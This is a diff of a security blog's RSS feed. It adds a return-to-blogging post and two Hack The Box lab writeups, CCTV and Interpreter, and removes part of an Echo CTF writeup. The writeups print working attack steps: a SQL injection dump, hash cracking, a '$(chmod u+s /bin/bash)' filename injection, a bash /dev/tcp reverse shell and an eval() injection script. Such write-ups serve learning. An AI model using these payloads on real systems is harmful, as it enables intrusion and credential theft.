@@ -4,9 +4,40 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Fri, 10 Apr 2026 19:35:08 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 16 Sep 2026 19:06:19 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Here I am. Giuslock here.]]></title>
+            <guid>1f824935eac64fd989ee0898ac5b64cc</guid>
+            <pubDate>Wed, 16 Sep 2026 17:38:52 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="im-back">I'm Back</h1>
+<p>Here I am. <strong>Giuslock here.</strong></p>
+<p>It’s been months since I last wrote something on this blog.</p>
+<p>After getting my <strong>CPTS</strong>, I just stopped.</p>
+<p>For a while, I fell into the AI-doomer rabbit hole. I started listening to people constantly talking about existential risks, the destruction of humanity, massive autonomous botnets, and every possible catastrophic scenario involving AI.</p>
+<p>And, whether I liked it or not, it made me question what I was doing with my life and whether spending so much time learning cybersecurity still made sense.</p>
+<p>After these months away, I’ve come to a much simpler conclusion:</p>
+<p><strong>I don't want to give these people that much power over what I enjoy doing.</strong></p>
+<p>The same conversations are still happening today. People keep talking about AI destroying humanity, creating enormous botnets, automatically compromising everything connected to the Internet, and so on — often while showing surprisingly little understanding of how cybersecurity actually works.</p>
+<p>Personally, I’d be much more concerned about how AI is already being used by <a title="https://apnews.com/article/yemen-houthis-anthropic-ai-missiles-9b20934e031ff3d99dd8bb49d85d97a9" href="https://apnews.com/article/yemen-houthis-anthropic-ai-missiles-9b20934e031ff3d99dd8bb49d85d97a9">armed and terrorist groups in the real world</a> than about Claude refusing to inspect a piece of malware during a legitimate malware analysis.</p>
+<p><em>Just saying.</em></p>
+<p>Anyway, <strong>I'm back.</strong></p>
+<p>And I'm coming back stronger than before.</p>
+<p>My next target is the <strong>OSCP</strong>.</p>
+<p>From now on, I want to start publishing again: things I discover, techniques I learn, labs I break, mistakes I make, and whatever else I find interesting while continuing down this path.</p>
+<p>I spent enough time questioning whether I should keep going.</p>
+<p><strong>I will.</strong></p>
+<p>And if there's one thing I want to leave here for anyone going through the same kind of period:</p>
+<blockquote>
+<p>Don't quit.<br />
+Keep learning.<br />
+Keep building.<br />
+Keep breaking things.<br />
+Keep going.</p>
+</blockquote>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[OSCP Preparation - CHALLENGE_0 Secura - Writeup]]></title>
             <guid>9d3cde14f592486ab24e3235f017c1c2</guid>
@@ -378,6 +409,335 @@ d<span class="hljs-literal">-----</span> TEMP
 <p>It’s not Terminator knocking at the door. It is, quite simply, plain old financial capitalism.</p>
 <h3 id="the-complete-investigation">The Complete Investigation</h3>
 <p>This article only scratches the surface. If you want to dive deeper into the financial data, the timeline of the merger, and the concrete evidence of this AI-washing strategy, I have compiled everything into a <a title="https://docs.google.com/document/d/1YqG1ql-fQTIlsDjGMAzTsU1cb1SXv3Ka9Ha5gzxWBOg/edit?usp=sharing" href="https://docs.google.com/document/d/1YqG1ql-fQTIlsDjGMAzTsU1cb1SXv3Ka9Ha5gzxWBOg/edit?usp=sharing">comprehensive research paper</a>.</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[CCTV — HackTheBox Seasonal Writeup]]></title>
+            <guid>975ccbaf78434ab88514c339279023cb</guid>
+            <pubDate>Mon, 09 Mar 2026 17:16:31 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="cctv-hackthebox-seasonal-writeup">CCTV — HackTheBox Seasonal Writeup</h1>
+<p><strong>Date:</strong> 2026-03-09<br />
+<strong>IP:</strong> 10.129.1.238<br />
+<strong>Hostname:</strong> CCTV.htb<br />
+<strong>Difficulty:</strong> Beginner<br />
+<strong>OS:</strong> Ubuntu 24.04.4 LTS</p>
+<hr />
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a title="#reconnaissance" href="#reconnaissance">Reconnaissance</a></li>
+<li><a title="#foothold--cve-2024-51482-zoneminder-sqli" href="#foothold--cve-2024-51482-zoneminder-sqli">Foothold - CVE-2024-51482 (ZoneMinder SQLi)</a></li>
+<li><a title="#privilege-escalation--mark--sa_mark-user-flag" href="#privilege-escalation--mark--sa_mark-user-flag">Privilege Escalation - mark to sa_mark (User Flag)</a></li>
+<li><a title="#privilege-escalation--sa_mark--root-root-flag" href="#privilege-escalation--sa_mark--root-root-flag">Privilege Escalation - sa_mark to root (Root Flag)</a></li>
+<li><a title="#vulnerability-summary" href="#vulnerability-summary">Vulnerability Summary</a></li>
+<li><a title="#kill-chain" href="#kill-chain">Kill Chain</a></li>
+</ul>
+<hr />
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Initial nmap scan:</p>
+<div><pre class="hljs"><code>nmap -sCV -T4 10.129.1.238</code></pre></div>
+<p>Two open ports:</p>
+<ul>
+<li><strong>22/tcp</strong> — OpenSSH 9.6p1</li>
+<li><strong>80/tcp</strong> — Apache 2.4.58 → ZoneMinder CCTV platform</li>
+</ul>
+<hr />
+<h2 id="foothold-cve-2024-51482-zoneminder-sqli">Foothold — CVE-2024-51482 (ZoneMinder SQLi)</h2>
+<h3 id="1-zoneminder-access">1. ZoneMinder Access</h3>
+<p>Browsing to <code>http://CCTV.htb/zm/</code> reveals the ZoneMinder dashboard, accessible with default credentials.</p>
+<h3 id="2-sql-injection">2. SQL Injection</h3>
+<p>ZoneMinder 1.37.63 is vulnerable to <strong>CVE-2024-51482</strong> — a critical SQL Injection (CVSS 10.0) in the <code>tid</code> parameter of the <code>removetag</code> endpoint.</p>
+<div><pre class="hljs"><code>GET /zm/<span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">view</span>=request<span class="hljs-variable">&amp;request</span>=event<span class="hljs-variable">&amp;action</span>=removetag<span class="hljs-variable">&amp;tid</span>=[SQLI]</code></pre></div>
+<p>Exploitation with sqlmap (time-based blind):</p>
+<div><pre class="hljs"><code>sqlmap -r request1.txt --dbms=mysql --dump -T Users -D zm</code></pre></div>
+<p>Dump of the <code>zm.Users</code> table → 3 users with bcrypt hashes:</p>
+<ul>
+<li><code>superadmin</code> — hash not cracked</li>
+<li><code>mark</code> — cracked</li>
+<li><code>admin</code> — default credentials</li>
+</ul>
+<h3 id="3-cracking-and-ssh">3. Cracking and SSH</h3>
+<div><pre class="hljs"><code>hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre></div>
+<p>Result: <strong>mark:[REDACTED]</strong></p>
+<p>The password is reused on SSH:</p>
+<div><pre class="hljs"><code>ssh mark@cctv.htb  <span class="hljs-comment"># password: [REDACTED]</span></code></pre></div>
+<p><strong>Foothold obtained as <code>mark</code>.</strong></p>
+<hr />
+<h2 id="privilege-escalation-mark-sa_mark-user-flag">Privilege Escalation — mark → sa_mark (User Flag)</h2>
+<h3 id="4-network-sniffing-via-tcpdump">4. Network Sniffing via tcpdump</h3>
+<p>During system enumeration, <code>/usr/bin/tcpdump</code> has the <code>cap_net_raw=eip</code> capability, allowing <code>mark</code> to capture network traffic.</p>
+<p>Docker containers (network 172.25.0.0/16) communicate periodically on port 5000 in cleartext:</p>
+<div><pre class="hljs"><code>tcpdump -i any -nn -A tcp port 5000</code></pre></div>
+<p>Intercepted output:</p>
+<div><pre class="hljs"><code><span class="hljs-number">172.25.0.11</span>.<span class="hljs-number">51946</span> &gt; <span class="hljs-number">172</span>.<span class="hljs-number">25</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.<span class="hljs-number">5000</span>
+USERNAME=sa_mark;PASSWORD=<span class="hljs-string">[REDACTED]</span>;CMD=status</code></pre></div>
+<h3 id="5-ssh-as-sa_mark">5. SSH as sa_mark</h3>
+<div><pre class="hljs"><code>ssh sa_mark@cctv.htb  <span class="hljs-comment"># password: [REDACTED]</span>
+cat ~/user.txt</code></pre></div>
+<p><strong>User flag obtained.</strong></p>
+<hr />
+<h2 id="privilege-escalation-sa_mark-root-root-flag">Privilege Escalation — sa_mark → root (Root Flag)</h2>
+<h3 id="6-motioneye-enumeration">6. MotionEye Enumeration</h3>
+<p>In <code>sa_mark</code>'s home directory there is a company PDF (<code>SecureVision Staff Announcement.pdf</code>) indicating the migration from <strong>MotionEye</strong> to <strong>ZoneMinder</strong> with the note:</p>
+<blockquote>
+<p><em>"Staff logins will remain the same. You will continue to use your existing credentials to access the new system."</em></p>
+</blockquote>
+<p>Enumerating internal services (<code>ss -tlnp</code>) reveals <strong>MotionEye 0.43.1b4</strong> on <code>localhost:8765</code>.</p>
+<h3 id="7-password-reuse-motioneye-admin">7. Password Reuse → MotionEye Admin</h3>
+<p>The MotionEye config (<code>/etc/motioneye/motion.conf</code>) contains the SHA1 hash of the admin password:</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># <span class="hljs-doctag">@admin</span>_password [REDACTED]</span></code></pre></div>
+<p>Verifying password reuse:</p>
+<div><pre class="hljs"><code><span class="hljs-built_in">echo</span> -n <span class="hljs-string">"[REDACTED]"</span> | sha1sum
+<span class="hljs-comment"># [REDACTED]  &lt;- MATCH!</span></code></pre></div>
+<p><code>sa_mark</code>'s password is the same as the MotionEye admin password.</p>
+<h3 id="8-cve-2025-60787-motioneye-config-injection-rce">8. CVE-2025-60787 — MotionEye Config Injection RCE</h3>
+<p>MotionEye 0.43.1b4 is vulnerable to <strong>CVE-2025-60787</strong>: configuration field values (e.g., <code>image_file_name</code>) are not sanitized server-side and are written directly into motion config files. When motion saves an image, the filename containing <code>$(cmd)</code> is passed to the <code>on_picture_save</code> script and interpreted by the shell.</p>
+<p><strong>The MotionEye service runs as root</strong> (<code>User=root</code> in <code>/etc/systemd/system/motioneye.service</code>).</p>
+<p>Custom exploit (<code>exploit_motioneye.py</code>) with signature-based authentication:</p>
+<ol>
+<li><strong>API authentication</strong>: HMAC-SHA1 signature using the admin password hash</li>
+<li><strong>Read camera config</strong>: <code>GET /config/1/get</code></li>
+<li><strong>Payload injection</strong>: <code>POST /config/1/set</code> with <code>image_file_name</code> = <code>$(chmod u+s /bin/bash).%Y-%m-%d-%H-%M-%S</code></li>
+<li><strong>Trigger</strong>: snapshot via motion webcontrol</li>
+</ol>
+<div><pre class="hljs"><code>python3 exploit_motioneye.py \
+  --target 127.0.0.1 --port 8765 \
+  --key <span class="hljs-string">"[REDACTED]"</span> \
+  --cmd <span class="hljs-string">"chmod u+s /bin/bash"</span></code></pre></div>
+<div><pre class="hljs"><code>curl -s <span class="hljs-string">"http://127.0.0.1:7999/1/action/snapshot"</span></code></pre></div>
+<h3 id="9-root-shell">9. Root Shell</h3>
+<div><pre class="hljs"><code>bash -p
+whoami
+<span class="hljs-comment"># root</span>
+cat /root/root.txt</code></pre></div>
+<p><strong>Root flag obtained.</strong></p>
+<hr />
+<h2 id="vulnerability-summary">Vulnerability Summary</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnerability</th>
+<th>CVE</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>ZoneMinder SQLi (removetag)</td>
+<td>CVE-2024-51482</td>
+<td>DB credential dump</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Password Reuse (mark: ZoneMinder → SSH)</td>
+<td>-</td>
+<td>Foothold as mark</td>
+</tr>
+<tr>
+<td>3</td>
+<td>tcpdump cap_net_raw + Plaintext Credentials</td>
+<td>-</td>
+<td>Lateral movement mark → sa_mark</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Password Reuse (sa_mark → MotionEye admin)</td>
+<td>-</td>
+<td>MotionEye admin access</td>
+</tr>
+<tr>
+<td>5</td>
+<td>MotionEye Config Injection RCE</td>
+<td>CVE-2025-60787</td>
+<td>Root RCE</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kill-chain">Kill Chain</h2>
+<div><pre class="hljs"><code><span class="hljs-selector-tag">Internet</span> → <span class="hljs-selector-tag">ZoneMinder</span> (default creds) → <span class="hljs-selector-tag">SQLi</span> <span class="hljs-selector-tag">CVE-2024-51482</span> → <span class="hljs-selector-tag">mark</span>:<span class="hljs-selector-attr">[REDACTED]</span>
+  → <span class="hljs-selector-tag">SSH</span> <span class="hljs-selector-tag">mark</span> → <span class="hljs-selector-tag">tcpdump</span> <span class="hljs-selector-tag">cap_net_raw</span> → <span class="hljs-selector-tag">sa_mark</span>:<span class="hljs-selector-attr">[REDACTED]</span>
+    → <span class="hljs-selector-tag">SSH</span> <span class="hljs-selector-tag">sa_mark</span> → <span class="hljs-selector-tag">PDF</span> <span class="hljs-selector-tag">password</span> <span class="hljs-selector-tag">reuse</span> <span class="hljs-selector-tag">hint</span> → <span class="hljs-selector-tag">MotionEye</span> <span class="hljs-selector-tag">admin</span>
+      → <span class="hljs-selector-tag">CVE-2025-60787</span> <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">injection</span> → <span class="hljs-selector-tag">chmod</span> <span class="hljs-selector-tag">u</span>+<span class="hljs-selector-tag">s</span> /<span class="hljs-selector-tag">bin</span>/<span class="hljs-selector-tag">bash</span> → <span class="hljs-selector-tag">ROOT</span></code></pre></div>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Interpreter - Hack The Box Writeup]]></title>
+            <guid>c6464ca5358b41e6bbb1b37e278d0e58</guid>
+            <pubDate>Mon, 09 Mar 2026 17:15:53 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="interpreter-hack-the-box-writeup">Interpreter - Hack The Box Writeup</h1>
+<p><strong>Machine:</strong> Interpreter<br />
+<strong>OS:</strong> Linux (Debian 12)<br />
+<strong>Difficulty:</strong> Medium<br />
+<strong>IP:</strong> 10.129.9.96</p>
+<hr />
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a title="#summary" href="#summary">Summary</a></li>
+<li><a title="#enumeration" href="#enumeration">Enumeration</a></li>
+<li><a title="#foothold---cve-2023-43208-pre-auth-rce" href="#foothold---cve-2023-43208-pre-auth-rce">Foothold - CVE-2023-43208 (Pre-Auth RCE)</a></li>
+<li><a title="#lateral-movement---mirth-to-sedric" href="#lateral-movement---mirth-to-sedric">Lateral Movement - mirth to sedric</a></li>
+<li><a title="#privilege-escalation---sedric-to-root" href="#privilege-escalation---sedric-to-root">Privilege Escalation - sedric to root</a></li>
+<li><a title="#attack-chain-summary" href="#attack-chain-summary">Attack Chain Summary</a></li>
+<li><a title="#key-takeaways" href="#key-takeaways">Key Takeaways</a></li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
+<p>Interpreter is a Linux machine running Mirth Connect 4.4.0, a healthcare integration engine vulnerable to pre-authenticated Remote Code Execution (CVE-2023-43208). After obtaining a foothold as the <code>mirth</code> service account, database credentials found in the Mirth configuration file are used to extract a PBKDF2-HMAC-SHA256 password hash for user <code>sedric</code>. The hash is cracked with hashcat and rockyou, granting SSH access and the user flag. Privilege escalation is achieved by exploiting a Python f-string injection vulnerability in a Flask notification service (<code>notif.py</code>) running as root on localhost, which unsafely uses <code>eval()</code> on user-controlled input.</p>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap-scan">Nmap Scan</h3>
+<div><pre class="hljs"><code>nmap -sC -sV --top-ports 1000 -T4 10.129.9.96</code></pre></div>
+<div><pre class="hljs"><code>PORT    STATE SERVICE  <span class="hljs-keyword">VERSION</span>
+<span class="hljs-number">22</span>/tcp  <span class="hljs-keyword">open</span>  ssh      OpenSSH <span class="hljs-number">9.2</span>p1 Debian <span class="hljs-number">2</span>+deb12u7
+<span class="hljs-number">80</span>/tcp  <span class="hljs-keyword">open</span>  http     Jetty
+|_http-title: Mirth <span class="hljs-keyword">Connect</span> Administrator
+<span class="hljs-number">443</span>/tcp <span class="hljs-keyword">open</span>  ssl/http Jetty
+|_http-title: Mirth <span class="hljs-keyword">Connect</span> Administrator
+| ssl-cert: Subject: commonName=mirth-<span class="hljs-keyword">connect</span></code></pre></div>
+<p>Three open ports: SSH (22), HTTP (80), and HTTPS (443). Both web ports serve Mirth Connect Administrator, a healthcare data integration platform built on Jetty.</p>
+<h3 id="mirth-connect-identification">Mirth Connect Identification</h3>
+<p>Mirth Connect is a widely used open-source integration engine for healthcare data (HL7, FHIR, etc.). The SSL certificate confirms the CN as <code>mirth-connect</code>. Researching known vulnerabilities for Mirth Connect reveals critical CVEs affecting versions prior to 4.4.1.</p>
+<hr />
+<h2 id="foothold-cve-2023-43208-pre-auth-rce">Foothold - CVE-2023-43208 (Pre-Auth RCE)</h2>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>CVE-2023-43208 is a pre-authenticated Remote Code Execution vulnerability in Mirth Connect &lt; 4.4.1. It is a bypass of the earlier CVE-2023-37679. The root cause is insecure deserialization through the XStream library: an attacker sends a crafted XML payload to the <code>/api/users</code> endpoint, which triggers arbitrary Java code execution via chained <code>InvokerTransformer</code> classes from Apache Commons Collections.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>A public PoC exploit is available at <a title="https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc" href="https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc">jakabakos/CVE-2023-43208-mirth-connect-rce-poc</a>.</p>
+<p><strong>Start a listener:</strong></p>
+<div><pre class="hljs"><code>nc -lvnp 4444</code></pre></div>
+<p><strong>Generate the reverse shell payload:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-built_in">echo</span> -n <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1'</span> | base64</code></pre></div>
+<p><strong>Fire the exploit:</strong></p>
+<div><pre class="hljs"><code>python3 CVE-2023-43208.py \
+  -u https://10.129.9.96 \
+  -c <span class="hljs-string">"bash -c {echo,&lt;BASE64_PAYLOAD&gt;}|{base64,-d}|{bash,-i}"</span></code></pre></div>
+<p>This yields a shell as the <code>mirth</code> service account (uid=103).</p>
+<hr />
+<h2 id="lateral-movement-mirth-to-sedric">Lateral Movement - mirth to sedric</h2>
+<h3 id="database-credential-discovery">Database Credential Discovery</h3>
+<p>The Mirth Connect configuration file at <code>/usr/local/mirthconnect/conf/mirth.properties</code> contains plaintext database credentials:</p>
+<div><pre class="hljs"><code><span class="hljs-attr">database</span> = <span class="hljs-string">mysql</span>
+<span class="hljs-attr">database.url</span> = <span class="hljs-string">jdbc:mariadb://localhost:3306/mc_bdd_prod</span>
+<span class="hljs-attr">database.username</span> = <span class="hljs-string">mirthdb</span>
+<span class="hljs-attr">database.password</span> = <span class="hljs-string">[REDACTED]</span></code></pre></div>
+<h3 id="extracting-the-password-hash">Extracting the Password Hash</h3>
+<p>Using the database credentials to query MariaDB:</p>
+<div><pre class="hljs"><code>mysql -u mirthdb -p<span class="hljs-string">'[REDACTED]'</span> mc_bdd_prod -e <span class="hljs-string">"SELECT * FROM PERSON;"</span>
+<span class="hljs-comment"># ID=2, USERNAME=sedric</span>
+
+mysql -u mirthdb -p<span class="hljs-string">'[REDACTED]'</span> mc_bdd_prod -e <span class="hljs-string">"SELECT * FROM PERSON_PASSWORD;"</span>
+<span class="hljs-comment"># PERSON_ID=2, PASSWORD=[REDACTED]</span></code></pre></div>
+<p><code>sedric</code> is the only user in the Mirth Connect application and the only non-root user on the system with a login shell (<code>/bin/bash</code>).</p>
+<h3 id="cracking-the-hash">Cracking the Hash</h3>
+<p>Mirth Connect 4.4.0 uses <strong>PBKDF2-HMAC-SHA256</strong> with <strong>600,000 iterations</strong>, an 8-byte salt, and a 256-bit derived key. The stored format is <code>base64(salt || derived_key)</code>.</p>
+<p><strong>Decompose the hash for hashcat:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">import</span> base64
+h = base64.b64decode(<span class="hljs-string">'&lt;HASH_BASE64&gt;'</span>)
+salt = h[:<span class="hljs-number">8</span>]
+dk   = h[<span class="hljs-number">8</span>:]
+
+<span class="hljs-comment"># hashcat mode 10900 format:</span>
+<span class="hljs-comment"># sha256:600000:&lt;SALT_B64&gt;:&lt;DK_B64&gt;</span></code></pre></div>
+<p><strong>Crack with hashcat:</strong></p>
+<div><pre class="hljs"><code>hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --force</code></pre></div>
+<div><pre class="hljs"><code>Status<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..: Cracked</code></pre></div>
+<p>The password is a common word found in rockyou.txt.</p>
+<h3 id="ssh-access">SSH Access</h3>
+<div><pre class="hljs"><code>ssh sedric@10.129.9.96
+<span class="hljs-comment"># Password: [REDACTED]</span></code></pre></div>
+<h3 id="user-flag">User Flag</h3>
+<div><pre class="hljs"><code>cat ~/user.txt
+<span class="hljs-comment"># [REDACTED]</span></code></pre></div>
+<hr />
+<h2 id="privilege-escalation-sedric-to-root">Privilege Escalation - sedric to root</h2>
+<h3 id="identifying-the-target">Identifying the Target</h3>
+<p>During enumeration as <code>mirth</code>, process listing revealed a Python script running as <strong>root</strong>:</p>
+<div><pre class="hljs"><code>root  <span class="hljs-number">3507</span>  <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 /u</span>sr<span class="hljs-regexp">/local/</span>bin/notif.py</code></pre></div>
+<p>The file is owned by <code>root:sedric</code> with permissions <code>rwxr-x---</code>, meaning <code>sedric</code> can read it. The service listens on <code>127.0.0.1:54321</code>.</p>
+<h3 id="analyzing-notifpy">Analyzing notif.py</h3>
+<div><pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>(<span class="hljs-params">first, last, sender, ts, dob, gender</span>):
+    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r"^[a-zA-Z0-9._'\"(){}=+/]+$"</span>)
+    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> [first, last, sender, ts, dob, gender]:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pattern.fullmatch(s):
+            <span class="hljs-keyword">return</span> <span class="hljs-string">"[INVALID_INPUT]"</span>
+
+    <span class="hljs-keyword">try</span>:
+        year_of_birth = <span class="hljs-built_in">int</span>(dob.split(<span class="hljs-string">'/'</span>)[-<span class="hljs-number">1</span>])
+        <span class="hljs-keyword">if</span> year_of_birth &lt; <span class="hljs-number">1900</span> <span class="hljs-keyword">or</span> year_of_birth &gt; datetime.now().year:
+            <span class="hljs-keyword">return</span> <span class="hljs-string">"[INVALID_DOB]"</span>
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"[INVALID_DOB]"</span>
+
+    template = <span class="hljs-string">f"Patient <span class="hljs-subst">{first}</span> <span class="hljs-subst">{last}</span> (<span class="hljs-subst">{gender}</span>), {{datetime.now().year - year_of_birth}} years old, received from <span class="hljs-subst">{sender}</span> at <span class="hljs-subst">{ts}</span>"</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">f"f'''<span class="hljs-subst">{template}</span>'''"</span>)   <span class="hljs-comment"># &lt;-- VULNERABLE</span>
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f"[EVAL_ERROR] <span class="hljs-subst">{e}</span>"</span></code></pre></div>
+<p>The vulnerability is clear:</p>
+<ol>
+<li>User-controlled fields (<code>first</code>, <code>last</code>, <code>sender</code>, <code>ts</code>, <code>gender</code>) are interpolated into a string</li>
+<li>That string is then passed to <code>eval()</code> as an f-string</li>
+<li>The input validation regex allows curly braces <code>{}</code>, enabling Python expression injection</li>
+<li>Spaces are not allowed, but this is trivially bypassed using <code>chr()</code> to construct arbitrary strings</li>
+</ol>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>The service only accepts POST requests from localhost to <code>/addPatient</code> with XML patient data. Since <code>os</code> is already imported in the script's namespace, we can call <code>os.popen()</code> directly.</p>
+<p><strong>Build the payload</strong> (spaces bypassed with <code>chr()</code>):</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># Build the command string as chr() concatenation to bypass the no-spaces regex</span>
+<span class="hljs-comment"># e.g. chr(99)+chr(97)+chr(116)+chr(32)+... for "cat /root/root.txt"</span></code></pre></div>
+<p><strong>Send the malicious XML from sedric's SSH session:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">import</span> urllib.request
+
+xml = <span class="hljs-string">"""&lt;patient&gt;
+  &lt;timestamp&gt;20250919&lt;/timestamp&gt;
+  &lt;sender_app&gt;WEBAPP&lt;/sender_app&gt;
+  &lt;id&gt;1&lt;/id&gt;
+  &lt;firstname&gt;{os.popen(&lt;CHR_PAYLOAD&gt;).read()}&lt;/firstname&gt;
+  &lt;lastname&gt;Doe&lt;/lastname&gt;
+  &lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+  &lt;gender&gt;M&lt;/gender&gt;
+&lt;/patient&gt;"""</span>
+
+req = urllib.request.Request(
+    <span class="hljs-string">"http://127.0.0.1:54321/addPatient"</span>,
+    method=<span class="hljs-string">"POST"</span>,
+    data=xml.encode(),
+    headers={<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"text/plain"</span>}
+)
+resp = urllib.request.urlopen(req)
+<span class="hljs-built_in">print</span>(resp.read().decode())</code></pre></div>
+<p>The root flag is returned in the response output.</p>
+<h3 id="root-flag">Root Flag</h3>
+<div><pre class="hljs"><code><span class="hljs-string">[REDACTED]</span></code></pre></div>
+<hr />
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+<div><pre class="hljs"><code>Attacker
+   |
+   <span class="hljs-type">+--[1</span>] CVE<span class="hljs-number">-2023</span><span class="hljs-number">-43208</span> (Mirth Connect <span class="hljs-number">4.4</span><span class="hljs-number">.0</span> pre-auth RCE)
+   |     <span class="hljs-type">XStream</span> deserialization on /api/users
+   |     <span class="hljs-type">-&gt; Shell</span> <span class="hljs-built_in">as</span>: mirth
+   |
+   <span class="hljs-type">+--[2</span>] Database credential harvesting (mirth.properties)
+   |     <span class="hljs-type">-&gt; DB</span> credentials <span class="hljs-built_in">in</span> plaintext config
+   |     <span class="hljs-type">-&gt; PBKDF2</span>-HMAC-SHA256 hash <span class="hljs-keyword">for</span> sedric (<span class="hljs-number">600</span>k iterations)
+   |     <span class="hljs-type">-&gt; Cracked</span> <span class="hljs-built_in">with</span> hashcat + rockyou
+   |     <span class="hljs-type">-&gt; SSH</span> <span class="hljs-built_in">as</span>: sedric
+   |
+   <span class="hljs-type">+--[3</span>] Python f-string <span class="hljs-built_in">injection</span> via eval() <span class="hljs-built_in">in</span> notif.py
+         Service runs <span class="hljs-built_in">as</span> root on <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">54321</span>
+         Regex allows {} -&gt; inject {os.popen(...).read()}
+         Spaces bypassed <span class="hljs-built_in">with</span> chr()
+         -&gt; RCE <span class="hljs-built_in">as</span>: root</code></pre></div>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><strong>Patch management is critical</strong>: Mirth Connect 4.4.0 has a known pre-auth RCE. Upgrading to 4.4.1+ would have prevented the initial foothold.</li>
+<li><strong>Never store database credentials in plaintext configuration files</strong> accessible to service accounts.</li>
+<li><strong>PBKDF2 with high iterations is not enough</strong> if the password is weak and present in common wordlists.</li>
+<li><strong>Never use <code>eval()</code> on user-controlled input</strong>, even with input validation. The regex allowed <code>{}</code> which is the exact syntax needed for f-string injection. Use safe string formatting (<code>.format()</code> with positional args or template strings) instead.</li>
+<li><strong>Principle of least privilege</strong>: A notification service that only writes text files should not run as root.</li>
+</ul>
 ]]></content:encoded>
         </item>
         <item>
@@ -1108,204 +1468,6 @@ We searched for an exploit related to OverlayFS / FUSE and used the following ex
 <p><a title="https://github.com/xkaneiki/CVE-2023-0386" href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></p>
 <p><img src="/_resources/d929cb8c9c794c65b29fe94f9627ed38.png" /></p>
 <p><img src="/_resources/96d841c7173f4dfc86d24849fad1a5b7.png" /></p>
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Smithers - Echo CTF Challenge]]></title>
-            <guid>24c75d11c587410ea821bb85f18ffc85</guid>
-            <pubDate>Sat, 15 Feb 2025 16:54:47 GMT</pubDate>
-            <content:encoded><![CDATA[<p><img src="/_resources/a6e7b38cb9944cc4ba6cb5ffb04cef74.png" /></p>
-<p><a title="https://echoctf.red/target/5" href="https://echoctf.red/target/5">Link to target</a></p>
-<h2 id="introduction">Introduction</h2>
-<p>This post details the process of solving the "Smithers" challenge on echoctf.red.</p>
-<h2 id="enumeration-phase">Enumeration Phase</h2>
-<h3 id="nmap-scan">Nmap Scan</h3>
-<p>I start the reconnaissance with nmap:</p>
-<div><pre class="hljs"><code>PORT      STATE SERVICE   VERSION
-<span class="hljs-number">10888</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>      nginx
-| <span class="hljs-keyword">http</span>-methods: 
-|_  Supported Methods: GET HEAD POST
-|<span class="hljs-title">_http-title</span>: Network Tools
-<span class="hljs-number">11211</span>/tcp <span class="hljs-built_in">open</span>  memcached Memcached <span class="hljs-number">1.5</span><span class="hljs-number">.12</span> (uptime <span class="hljs-number">224</span> <span class="hljs-built_in">seconds</span>)</code></pre></div>
-<h3 id="web-server-on-port-10888">Web Server on Port 10888</h3>
-<p>There is a web server running on port 10888:<br />
-<img src="/_resources/65833c4c20ff4cbabeb2779c06f9ad35.png" /></p>
-<p>It mentions that these utilities are only available to authorized IP addresses.</p>
-<h3 id="extracting-information-from-memcached-with-metasploit">Extracting Information from Memcached with Metasploit</h3>
